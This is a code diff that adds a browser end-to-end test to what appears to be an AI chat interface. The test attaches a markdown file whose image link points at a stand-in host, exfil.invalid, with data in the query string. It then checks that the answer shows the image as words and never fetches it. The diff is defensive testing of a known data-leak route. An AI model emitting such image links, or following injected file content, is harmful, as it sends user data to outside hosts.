@@ -351,6 +351,30 @@ try {
     withFile.split("\n").find((line) => line.includes("sales.csv")) ?? "",
   );
 
+  // A file that makes the answer carry an image addressed to somebody else's host.
+  await page.goto(`${BASE}/?new=true`, { waitUntil: "networkidle" });
+  const leaks = [];
+  page.on("request", (request) => {
+    if (request.url().includes("exfil.invalid")) leaks.push(request.url());
+  });
+  await page.setInputFiles('input[aria-label="Attach files"]', {
+    name: "notes.md",
+    mimeType: "text/markdown",
+    buffer: Buffer.from("![quarterly chart](https://exfil.invalid/x?d=north-4210)\nend\n"),
+  });
+  await page.waitForTimeout(600);
+  await page.fill("#ocade-composer", "Summarise my notes");
+  await page.click('button[aria-label="Send"]');
+  await page.waitForSelector("text=stubbed OCADE answer", { timeout: 20_000 });
+  await page.waitForTimeout(800);
+  check(
+    "an image in an answer is shown as its words and never fetched",
+    leaks.length === 0 &&
+      (await page.locator('img[src*="exfil.invalid"]').count()) === 0 &&
+      (await page.locator("body").innerText()).includes("quarterly chart"),
+    leaks.join(" "),
+  );
+
   // Bytes that are not the image they claim to be.
   await page.goto(`${BASE}/?new=true`, { waitUntil: "networkidle" });
   await page.setInputFiles('input[aria-label="Attach files"]', {
